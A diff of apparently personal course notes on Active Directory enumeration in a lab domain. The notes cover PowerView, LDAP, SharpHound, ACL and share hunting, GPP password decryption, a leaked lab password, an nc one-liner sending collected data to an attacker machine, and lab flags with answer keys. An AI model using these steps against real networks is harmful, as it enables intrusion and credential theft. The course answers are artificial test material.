@@ -63,7 +63,7 @@ Goal: enumerate corp.com fully, find path to Domain Admin.
 
 When someone compromises a chained path through multiple higher-privilege accounts it's called a **chained compromise**.
 
-> 🔁 External reference: [HackTricks: Active Directory Methodology](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/README.md) — the full-spectrum enumeration checklist this module's approach maps onto. Good to cross-reference after finishing this module.
+> 🔁 External reference: [HackTricks: Active Directory Methodology](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/README.md), the full-spectrum enumeration checklist this module's approach maps onto. Good to cross-reference after finishing this module.
 
 ---
 
@@ -96,7 +96,7 @@ Expected output: list of all domain accounts printed under `\\DC1.corp.com`. In 
 net user jeffadmin /domain
 ```
 
-Expected: full attribute dump including `Global Group memberships` — `jeffadmin` is in `Domain Admins`. Flag any accounts with admin-sounding names (jeff**admin**, adminXXX, etc.).
+Expected: full attribute dump including `Global Group memberships`, `jeffadmin` is in `Domain Admins`. Flag any accounts with admin-sounding names (jeff**admin**, adminXXX, etc.).
 
 **List all domain groups:**
 
@@ -104,7 +104,7 @@ Expected: full attribute dump including `Global Group memberships` — `jeffadmi
 net group /domain
 ```
 
-Expected: all groups including built-in defaults and custom ones. Custom groups are interesting — `Sales Department`, `Management Department`, `Development Department`, `Debug`.
+Expected: all groups including built-in defaults and custom ones. Custom groups are interesting, `Sales Department`, `Management Department`, `Development Department`, `Debug`.
 
 **List members of a specific group:**
 
@@ -123,15 +123,15 @@ Expected: `pete` and `stephanie`. But note: `net.exe` only shows user objects in
 Q1: Which type of server acts as the core and hub of a domain hosted in Active Directory?
 **Answer: Domain Controller**
 
-> 🚩 Hands-on, VM spin-up required: 22.2.1 Q2 — VM Group 1, log in as stephanie, use net.exe to enumerate corp.com, find which user is a member of the Management Department group ✅ Done — **jen**
+> 🚩 Hands-on, VM spin-up required: 22.2.1 Q2. VM Group 1, log in as stephanie, use net.exe to enumerate corp.com, find which user is a member of the Management Department group ✅ Done, **jen**
 
-> 🚩 Hands-on, VM spin-up required: 22.2.1 Q3 — VM Group 2, use net.exe to enumerate users and groups in the modified corp.com domain to obtain the flag ✅ Done — flag `OS{9a96196d97c528fa733889f63a01a5fe}` (appeared embedded in a group name in the modified domain)
+> 🚩 Hands-on, VM spin-up required: 22.2.1 Q3. VM Group 2, use net.exe to enumerate users and groups in the modified corp.com domain to obtain the flag ✅ Done, flag `OS{9a96196d97c528fa733889f63a01a5fe}` (appeared embedded in a group name in the modified domain)
 
 ---
 
 ### 22.2.2 Enumerating AD Using PowerShell and .NET Classes
 
-`Get-ADUser` only works on DCs by default (RSAT). Instead, use .NET classes — works with any domain user, no admin needed.
+`Get-ADUser` only works on DCs by default (RSAT). Instead, use .NET classes, works with any domain user, no admin needed.
 
 #### LDAP path format
 
@@ -304,7 +304,7 @@ CN=pete,CN=Users,DC=corp,DC=com
 CN=stephanie,CN=Users,DC=corp,DC=com
 ```
 
-Note that `Development Department` is a **nested group** — `net.exe` missed this entirely.
+Note that `Development Department` is a **nested group**, `net.exe` missed this entirely.
 
 #### Unravelling nested groups
 
@@ -320,7 +320,7 @@ $group.properties.member
 
 Chain: Sales Department contains Development Department contains Management Department contains jen. Jen is indirectly a member of all three. Misconfigured indirect membership = potential privilege escalation.
 
-> 🔍 Worth remembering generally: nested group membership is invisible to `net.exe` but fully visible via LDAP. Always unravel nested groups — users often inherit more access than intended.
+> 🔍 Worth remembering generally: nested group membership is invisible to `net.exe` but fully visible via LDAP. Always unravel nested groups, users often inherit more access than intended.
 
 > 📸 Screenshot: nested group chain output in PowerShell showing Development Department → Management Department → jen
 
@@ -329,7 +329,7 @@ Chain: Sales Department contains Development Department contains Management Depa
 Q1: Which .NET class makes the search against Active Directory?
 **Answer: DirectorySearcher**
 
-> 🚩 Hands-on, VM spin-up required: 22.2.3 Q2 — VM Group 2, use the PowerShell function to enumerate domain groups starting with "Service Personnel", unravel the nested groups, enumerate the last direct user member's attributes to get the flag ✅ Done — nested chain Service Personnel → Billing → Customer support → michelle. Flag was in michelle's `description` attribute.
+> 🚩 Hands-on, VM spin-up required: 22.2.3 Q2. VM Group 2, use the PowerShell function to enumerate domain groups starting with "Service Personnel", unravel the nested groups, enumerate the last direct user member's attributes to get the flag ✅ Done, nested chain Service Personnel → Billing → Customer support → michelle. Flag was in michelle's `description` attribute.
 
 ---
 
@@ -366,20 +366,20 @@ Get-NetGroup "Sales Department" | select member
 
 Expected for `Get-NetUser | select cn,pwdlastset,lastlogon`: table showing all accounts, when passwords were last changed, and last logon times. Dormant accounts (old lastlogon, old pwdlastset) are soft targets.
 
-> 🔍 Worth remembering generally: dormant accounts are lower-risk targets during an engagement — less monitoring, potentially weaker passwords (set before the current policy), and fewer alerts if you log in. Always check `pwdlastset` and `lastlogon`.
+> 🔍 Worth remembering generally: dormant accounts are lower-risk targets during an engagement, less monitoring, potentially weaker passwords (set before the current policy), and fewer alerts if you log in. Always check `pwdlastset` and `lastlogon`.
 
 > 📸 Screenshot: PowerView Get-NetUser output with timestamp columns
 
-> 🔁 External reference: [ippsec.rocks PowerView search](https://ippsec.rocks/?#PowerView) — all IppSec boxes where PowerView appears, useful for seeing it used against real targets.
+> 🔁 External reference: [ippsec.rocks PowerView search](https://ippsec.rocks/?#PowerView), all IppSec boxes where PowerView appears, useful for seeing it used against real targets.
 
 **22.2.4 Labs**
 
 Q1: Which command can we use with PowerView to list the domain groups?
 **Answer: Get-NetGroup**
 
-> 🚩 Hands-on, VM spin-up required: 22.2.4 Q2 — VM Group 2, use PowerView to enumerate the modified corp.com domain, find which new user is part of Domain Admins ✅ Done — **nathalie** (VM required a full stop/restart to finish provisioning; first spin-up was incomplete)
+> 🚩 Hands-on, VM spin-up required: 22.2.4 Q2. VM Group 2, use PowerView to enumerate the modified corp.com domain, find which new user is part of Domain Admins ✅ Done, **nathalie** (VM required a full stop/restart to finish provisioning; first spin-up was incomplete)
 
-> 🚩 Hands-on, VM spin-up required: 22.2.4 Q3 — VM Group 2 continued, enumerate which Office the user "fred" is working in to obtain the flag ✅ Done — flag `OS{83705ff83d6fd0656ca22291a2adc801}` (fred's `physicaldeliveryofficename` attribute)
+> 🚩 Hands-on, VM spin-up required: 22.2.4 Q3. VM Group 2 continued, enumerate which Office the user "fred" is working in to obtain the flag ✅ Done, flag `OS{83705ff83d6fd0656ca22291a2adc801}` (fred's `physicaldeliveryofficename` attribute)
 
 ---
 
@@ -411,17 +411,17 @@ Expected output from lab env:
 
 The oldest OS is Windows 10 build 16299 (version 1709). Older OSes may have more vulnerabilities. The web server and file server are worth targeting.
 
-> 🔍 Worth remembering generally: grab OS + version early. Older builds mean older patches. Also reveals the scope — how many machines are actually in scope.
+> 🔍 Worth remembering generally: grab OS + version early. Older builds mean older patches. Also reveals the scope, how many machines are actually in scope.
 
 > 📸 Screenshot: Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion output
 
 **22.3.1 Labs**
 
-> 🚩 Hands-on, VM spin-up required: 22.3.1 Q1 — VM Group 1, use PowerView to get the DistinguishedName for the WEB04 machine ✅ Done — `CN=web04,CN=Computers,DC=corp,DC=com`
+> 🚩 Hands-on, VM spin-up required: 22.3.1 Q1. VM Group 1, use PowerView to get the DistinguishedName for the WEB04 machine ✅ Done, `CN=web04,CN=Computers,DC=corp,DC=com`
 
-> 🚩 Hands-on, VM spin-up required: 22.3.1 Q2 — VM Group 1, find the exact operating system version for FILES04 (format: xx.x (xxxxx)) ✅ Done — `10.0 (20348)` (copy the exact string from terminal output including the space before the parenthesis)
+> 🚩 Hands-on, VM spin-up required: 22.3.1 Q2. VM Group 1, find the exact operating system version for FILES04 (format: xx.x (xxxxx)) ✅ Done, `10.0 (20348)` (copy the exact string from terminal output including the space before the parenthesis)
 
-> 🚩 Hands-on, VM spin-up required: 22.3.1 Q3 — VM Group 2, enumerate operating systems in the modified corp.com domain to get the flag ✅ Done — flag `OS{9fbbdac3111332f364d262b1354fcb45}` (appeared in the `operatingsystemversion` field of one of the new machines)
+> 🚩 Hands-on, VM spin-up required: 22.3.1 Q3. VM Group 2, enumerate operating systems in the modified corp.com domain to get the flag ✅ Done, flag `OS{9fbbdac3111332f364d262b1354fcb45}` (appeared in the `operatingsystemversion` field of one of the new machines)
 
 ---
 
@@ -437,9 +437,9 @@ Find-LocalAdminAccess
 
 Uses `OpenServiceW` to try connecting to the Service Control Manager (SCM) with `SC_MANAGER_ALL_ACCESS`. If it succeeds, we have local admin.
 
-Expected output in lab: `client74.corp.com` — stephanie has admin on CLIENT74.
+Expected output in lab: `client74.corp.com`, stephanie has admin on CLIENT74.
 
-> ⚠️ This sprays every computer in the domain — generates noise. Note the time/decision carefully in a real engagement.
+> ⚠️ This sprays every computer in the domain, generates noise. Note the time/decision carefully in a real engagement.
 
 #### Enumerate logged-on sessions (limited success on modern Windows)
 
@@ -458,7 +458,7 @@ Expected result on modern Windows: `VERBOSE: [Get-NetSession] Error: Access is d
 Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
 ```
 
-Expected: `BUILTIN\Users Allow ReadKey` (can read the key itself) but `BUILTIN\Administrators Allow FullControl` and `NT AUTHORITY\SYSTEM Allow FullControl` — no Authenticated Users remote access to enumeration.
+Expected: `BUILTIN\Users Allow ReadKey` (can read the key itself) but `BUILTIN\Administrators Allow FullControl` and `NT AUTHORITY\SYSTEM Allow FullControl`, no Authenticated Users remote access to enumeration.
 
 The registry key `NetSessionEnum` relies on is: **SrvsvcSessionInfo**.
 
@@ -485,7 +485,7 @@ Expected for CLIENT74: `CORP\jeffadmin` logged on locally, `CORP\stephanie` via 
 
 > 🔍 Worth remembering generally: if `Get-NetSession` returns nothing and no error, that's actually a session result (for the machine you ran it from). If it errors with Access Denied, that's the DefaultSecurity permissions issue. Use `-Verbose` to distinguish.
 
-> 🔧 Technique: PsLoggedOn also uses NetSessionEnum internally — that's why CLIENT74 showed `stephanie` via resource shares (because we had an open session from CLIENT75, which needed a logon).
+> 🔧 Technique: PsLoggedOn also uses NetSessionEnum internally, that's why CLIENT74 showed `stephanie` via resource shares (because we had an open session from CLIENT75, which needed a logon).
 
 > 📸 Screenshot: PsLoggedOn output against CLIENT74 showing jeffadmin
 
@@ -499,15 +499,15 @@ Q1: What registry key does NetSessionEnum rely on to discover logged on sessions
 Q2: Which service must be enabled on the remote machine to make it possible for PsLoggedOn to enumerate sessions?
 **Answer: Remote Registry**
 
-> 🚩 Hands-on, VM spin-up required: 22.3.2 Q3 — VM Group 2, find which new machine stephanie has administrative privileges on, log in, obtain the flag from the Administrator Desktop ✅ Done — `Find-LocalAdminAccess` showed stephanie has admin on `web04.corp.com` and `client74.corp.com`. Direct path `C:\Users\Administrator\Desktop\` was access denied due to **UAC token filtering** (RDP domain user session gets a filtered token). Got the flag via UNC admin shares from CLIENT75 instead: `type \\web04\c$\Users\Administrator\Desktop\proof.txt`
+> 🚩 Hands-on, VM spin-up required: 22.3.2 Q3. VM Group 2, find which new machine stephanie has administrative privileges on, log in, obtain the flag from the Administrator Desktop ✅ Done, `Find-LocalAdminAccess` showed stephanie has admin on `web04.corp.com` and `client74.corp.com`. Direct path `C:\Users\Administrator\Desktop\` was access denied due to **UAC token filtering** (RDP domain user session gets a filtered token). Got the flag via UNC admin shares from CLIENT75 instead: `type \\web04\c$\Users\Administrator\Desktop\proof.txt`
 
-> 🔧 Technique — UAC token filtering: when you RDP to a machine as a domain user who happens to be a local admin, the session runs a **filtered token** — you can't directly access other users' profiles or restricted paths. The unfiltered admin token is only available when you explicitly elevate. Workaround: access admin shares from a different machine using `\\target\c$\...` over the network rather than locally — that path uses the network token which isn't filtered.
+> 🔧 Technique. UAC token filtering: when you RDP to a machine as a domain user who happens to be a local admin, the session runs a **filtered token**, you can't directly access other users' profiles or restricted paths. The unfiltered admin token is only available when you explicitly elevate. Workaround: access admin shares from a different machine using `\\target\c$\...` over the network rather than locally, that path uses the network token which isn't filtered.
 
 ---
 
 ### 22.3.3 Enumeration Through Service Principal Names
 
-Services in AD run under **Service Accounts**. When an application (Exchange, MSSQL, IIS) integrates with AD, it registers a **Service Principal Name (SPN)** — a unique identifier linking the service to a specific AD account.
+Services in AD run under **Service Accounts**. When an application (Exchange, MSSQL, IIS) integrates with AD, it registers a **Service Principal Name (SPN)**, a unique identifier linking the service to a specific AD account.
 
 SPNs let us enumerate what services are running on which servers without port scanning.
 
@@ -516,7 +516,7 @@ SPNs let us enumerate what services are running on which servers without port sc
 setspn -L iis_service
 ```
 
-Expected: `HTTP/web04.corp.com`, `HTTP/web04`, `HTTP/web04.corp.com:80` — this is a web server.
+Expected: `HTTP/web04.corp.com`, `HTTP/web04`, `HTTP/web04.corp.com:80`, this is a web server.
 
 ```powershell
 # List all accounts with SPNs (via PowerView)
@@ -536,7 +536,7 @@ Expected: resolves to an internal IP (e.g. 192.168.50.72), showing a web server 
 
 > 🔍 Worth remembering generally: SPN enumeration = free service map of the domain without a single port scan. Any account with an SPN is potentially Kerberoastable (covered in the auth attacks module).
 
-> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.8. Kerberoasting|HTB AD §8 Kerberoasting]] — SPNs are the prerequisite for Kerberoasting.
+> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.8. Kerberoasting|HTB AD §8 Kerberoasting]]. SPNs are the prerequisite for Kerberoasting.
 
 **22.3.3 Labs**
 
@@ -619,9 +619,9 @@ Get-NetGroup "Management Department" | select member
 
 > 📸 Screenshot: Get-ObjectAcl output showing stephanie with GenericAll on Management Department
 
-> 🔁 External reference: [HackTricks: AD ACLs/DACLs/SACLs/ACEs](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acls-dacls-sacls-aces.md) — full breakdown of every ACE type and how to abuse each one.
+> 🔁 External reference: [HackTricks: AD ACLs/DACLs/SACLs/ACEs](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acls-dacls-sacls-aces.md), full breakdown of every ACE type and how to abuse each one.
 
-> 🔁 External reference: [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) — ACL abuse section has command chains for GenericAll, GenericWrite, ForceChangePassword, etc.
+> 🔁 External reference: [PayloadsAllTheThings: Active Directory Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md). ACL abuse section has command chains for GenericAll, GenericWrite, ForceChangePassword, etc.
 
 **22.3.4 Labs**
 
@@ -656,7 +656,7 @@ ls \\dc1.corp.com\sysvol\corp.com\Policies\
 cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
 ```
 
-The XML file contains a `cpassword` field — a GPP (Group Policy Preferences) encrypted password. These are encrypted with AES-256 but the private key was published on MSDN. **Completely broken.** Decrypt on Kali:
+The XML file contains a `cpassword` field, a GPP (Group Policy Preferences) encrypted password. These are encrypted with AES-256 but the private key was published on MSDN. **Completely broken.** Decrypt on Kali:
 
 ```bash
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
@@ -670,9 +670,9 @@ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 findstr /S /I "cpassword" \\dc1.corp.com\sysvol\
 ```
 
-> 🔁 External reference: [HackTricks: GPP Passwords](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/README.md) — also check ippsec.rocks `#GPP` for real examples in HTB boxes like Active.
+> 🔁 External reference: [HackTricks: GPP Passwords](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/README.md), also check ippsec.rocks `#GPP` for real examples in HTB boxes like Active.
 
-> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)]] — Active (HTB) builds this exact technique into the box.
+> 🔁 Similar to: [[Active Directory Enumeration & Attacks (HTB Supplementary)]]. Active (HTB) builds this exact technique into the box.
 
 #### docshare on FILES04
 
@@ -682,7 +682,7 @@ ls \\FILES04\docshare\docs\do-not-share
 cat \\FILES04\docshare\docs\do-not-share\start-email.txt
 ```
 
-Expected: email thread between Stephanie and Jeff. Jeff's auto-generated password: `HenchmanPutridBonbon11`. Possibly changed but worth noting — gives insight into the org's password pattern (word + word + number).
+Expected: email thread between Stephanie and Jeff. Jeff's auto-generated password: `HenchmanPutridBonbon11`. Possibly changed but worth noting, gives insight into the org's password pattern (word + word + number).
 
 > 📸 Screenshot: start-email.txt content showing the cleartext password
 
@@ -693,7 +693,7 @@ Expected: email thread between Stephanie and Jeff. Jeff's auto-generated passwor
 Q1: What is the hostname for the server sharing the SYSVOL folder in the corp.com domain?
 **Answer: DC1.corp.com**
 
-> 🚩 Hands-on, VM spin-up required: 22.3.5 Q2 — VM Group 2, use PowerView to locate shares in the modified corp.com domain and enumerate them to obtain the flag ✅ Done — flag `OS{ffb3e8d165609be495b7ad1e62a39083}` from `\\FILES04\Important Files\proof.txt`
+> 🚩 Hands-on, VM spin-up required: 22.3.5 Q2. VM Group 2, use PowerView to locate shares in the modified corp.com domain and enumerate them to obtain the flag ✅ Done, flag `OS{ffb3e8d165609be495b7ad1e62a39083}` from `\\FILES04\Important Files\proof.txt`
 
 ---
 
@@ -705,7 +705,7 @@ Manual enumeration works but is slow in large environments. BloodHound + SharpHo
 
 ### 22.4.1 Collecting Data with SharpHound
 
-SharpHound is the BloodHound data collector — written in C#. Can run as a compiled EXE, or as a PowerShell script (`SharpHound.ps1`).
+SharpHound is the BloodHound data collector, written in C#. Can run as a compiled EXE, or as a PowerShell script (`SharpHound.ps1`).
 
 Download the latest zip from the SharpHound GitHub, transfer to CLIENT75.
 
@@ -731,7 +731,7 @@ Key options:
 | `-ZipPassword` | Set a password on the zip |
 | `-Loop` / `-LoopDuration` | Run cyclically over time to capture sessions that come and go |
 
-The **Looping** function (`-Loop`) captures domain changes over a time period rather than a single snapshot — useful for catching users who log in after the initial collection.
+The **Looping** function (`-Loop`) captures domain changes over a time period rather than a single snapshot, useful for catching users who log in after the initial collection.
 
 > 🔍 Worth remembering generally: SharpHound looping is especially useful for capturing sessions. A snapshot might miss jeffadmin if he wasn't logged in at collection time. A 30-minute loop with 5-minute intervals would catch transient sessions.
 
@@ -741,11 +741,11 @@ Transfer the zip to Kali (simple `scp` or use RDP file drag if RDP supports it):
 scp stephanie@192.168.50.75:/Users/stephanie/Desktop/corp\ audit_*.zip .
 ```
 
-> 🔧 Technique — file transfer without Python/SSH: if SCP and Python aren't available on the target, use `nc64.exe` from cmd. PowerShell's `<` operator doesn't redirect stdin, but cmd's does:
+> 🔧 Technique, file transfer without Python/SSH: if SCP and Python aren't available on the target, use `nc64.exe` from cmd. PowerShell's `<` operator doesn't redirect stdin, but cmd's does:
 > `cmd /c "C:\Tools\nc64.exe <kali-ip> 9999 < ""filename with spaces"""` (double the quotes around filenames with spaces)
 > On Kali: `nc -lvnp 9999 > output.zip`
 
-> 🔁 External reference: [ippsec.rocks BloodHound search](https://ippsec.rocks/?#BloodHound) — all IppSec walkthroughs using BloodHound. Highly worth watching Forest and Sauna for how the data gets read.
+> 🔁 External reference: [ippsec.rocks BloodHound search](https://ippsec.rocks/?#BloodHound), all IppSec walkthroughs using BloodHound. Highly worth watching Forest and Sauna for how the data gets read.
 
 **22.4.1 Labs**
 
@@ -817,18 +817,18 @@ If we can log into CLIENT74 as stephanie (admin) and dump memory, we steal jeffa
 
 **Hover or right-click edges** to see what kind of relationship they represent (`AdminTo`, `MemberOf`, `HasSession`, etc.). Right-click + "? Help" shows the abuse technique, opsec notes, and references.
 
-**BloodHound relies on Neo4j** to display data as graphs — Neo4j is the graph database backend.
+**BloodHound relies on Neo4j** to display data as graphs. Neo4j is the graph database backend.
 
-> 🔁 External reference: [ippsec.rocks SharpHound search](https://ippsec.rocks/?#SharpHound) — specifically the Forest box walkthrough is the canonical "collect → import → read shortest path → exploit" demonstration.
+> 🔁 External reference: [ippsec.rocks SharpHound search](https://ippsec.rocks/?#SharpHound), specifically the Forest box walkthrough is the canonical "collect → import → read shortest path → exploit" demonstration.
 
 **22.4.2 Labs**
 
 Q1: Which service does BloodHound rely on to display the data in graphs?
 **Answer: Neo4j**
 
-> 🚩 Hands-on, VM spin-up required: 22.4.2 Q2 — VM Group 1, collect SharpHound data if not done, transfer to Kali, import to BloodHound, search for Management Department group, check Inbound Control Rights in Node Info — which group is the current owner? ✅ Done — **Domain Admins** (owns Management Department by default in AD; reasoned from hint about "wide-ranging admin privileges" and confirmed correct)
+> 🚩 Hands-on, VM spin-up required: 22.4.2 Q2. VM Group 1, collect SharpHound data if not done, transfer to Kali, import to BloodHound, search for Management Department group, check Inbound Control Rights in Node Info, which group is the current owner? ✅ Done, **Domain Admins** (owns Management Department by default in AD; reasoned from hint about "wide-ranging admin privileges" and confirmed correct)
 
-> 🚩 Hands-on, VM spin-up required: 22.4.2 Capstone — VM Group 2, log in as stephanie, enumerate object permissions for domain users, find weak permissions, use them to take full control of an account, log in as that account, repeat enumeration to obtain the flag ✅ Done — flag `OS{c0111b320ccc0c5b47f329eef4899798}` — see capstone walkthrough below.
+> 🚩 Hands-on, VM spin-up required: 22.4.2 Capstone. VM Group 2, log in as stephanie, enumerate object permissions for domain users, find weak permissions, use them to take full control of an account, log in as that account, repeat enumeration to obtain the flag ✅ Done, flag `OS{c0111b320ccc0c5b47f329eef4899798}`, see capstone walkthrough below.
 
 #### Capstone walkthrough
 
@@ -862,7 +862,7 @@ This module establishes the enumeration foundation that all upcoming AD attack m
 1. **User list** with timestamps (dormant accounts, password ages)
 2. **Group memberships** including nested groups (net.exe blind spot)
 3. **OS inventory** to identify old/unpatched systems
-4. **Active sessions** (who is logged in where — credential theft targets)
+4. **Active sessions** (who is logged in where, credential theft targets)
 5. **SPNs** (service map + Kerberoasting candidates)
 6. **Object permissions** (misconfigured ACEs = privilege escalation)
 7. **Domain shares** (SYSVOL GPP passwords, leaked credentials)
@@ -899,7 +899,7 @@ graph LR
     style MD fill:#c44,color:#fff
 ```
 
-Jen is a member of Management Department, which is inside Development Department, which is inside Sales Department. `net.exe` shows only the direct member of each group — it would show jen only if you looked at Management Department directly. LDAP unravels the full chain.
+Jen is a member of Management Department, which is inside Development Department, which is inside Sales Department. `net.exe` shows only the direct member of each group, it would show jen only if you looked at Management Department directly. LDAP unravels the full chain.
 
 ---
 
@@ -944,25 +944,25 @@ Note: direct path to Administrator Desktop from RDP session was blocked by **UAC
 | Intelligence (HTB) | AD recon via PDFs, RBCD, constrained delegation | [IppSec search](https://ippsec.rocks/?#Intelligence) |
 
 Technique keyword searches on ippsec.rocks:
-- [#BloodHound](https://ippsec.rocks/?#BloodHound) — all boxes where BloodHound drives the path
-- [#PowerView](https://ippsec.rocks/?#PowerView) — boxes where PowerView enumeration is the key step
-- [#SharpHound](https://ippsec.rocks/?#SharpHound) — SharpHound collection specifically
-- [#GPP](https://ippsec.rocks/?#GPP) — GPP cPassword finds across multiple boxes
+- [#BloodHound](https://ippsec.rocks/?#BloodHound), all boxes where BloodHound drives the path
+- [#PowerView](https://ippsec.rocks/?#PowerView), boxes where PowerView enumeration is the key step
+- [#SharpHound](https://ippsec.rocks/?#SharpHound). SharpHound collection specifically
+- [#GPP](https://ippsec.rocks/?#GPP). GPP cPassword finds across multiple boxes
 
 ---
 
 ## Related Boxes
 
 **Genuine technique boxes (AD enumeration core techniques):**
-- HTB Forest — BloodHound shortest path to DA, AS-REP roasting; closest match to this module's full enumeration workflow
-- HTB Active — GPP cPassword via SYSVOL enumeration (22.3.5) + Kerberoasting via SPN (22.3.3)
-- HTB Sauna — BloodHound + GenericAll ACE abuse (22.3.4) + DCSync as endpoint
-- HTB Cascade — LDAP attribute hunting for cleartext passwords; similar to the nested group + attribute deep-dive in 22.2.3
-- HTB Resolute — BloodHound enumeration reveals DnsAdmins abuse path; SharpHound data is the key
+- HTB Forest. BloodHound shortest path to DA, AS-REP roasting; closest match to this module's full enumeration workflow
+- HTB Active. GPP cPassword via SYSVOL enumeration (22.3.5) + Kerberoasting via SPN (22.3.3)
+- HTB Sauna. BloodHound + GenericAll ACE abuse (22.3.4) + DCSync as endpoint
+- HTB Cascade. LDAP attribute hunting for cleartext passwords; similar to the nested group + attribute deep-dive in 22.2.3
+- HTB Resolute. BloodHound enumeration reveals DnsAdmins abuse path; SharpHound data is the key
 
 **Adjacent workflow boxes (get foothold first, then enumerate):**
-- HTB Bounty — basic Windows target; AD enumeration not applicable but good for building enumeration muscle memory before AD
-- HTB Arctic — service account (IIS) as foothold; matches the SPN section's iis_service pattern (22.3.3)
+- HTB Bounty, basic Windows target; AD enumeration not applicable but good for building enumeration muscle memory before AD
+- HTB Arctic, service account (IIS) as foothold; matches the SPN section's iis_service pattern (22.3.3)
 
 ---
 
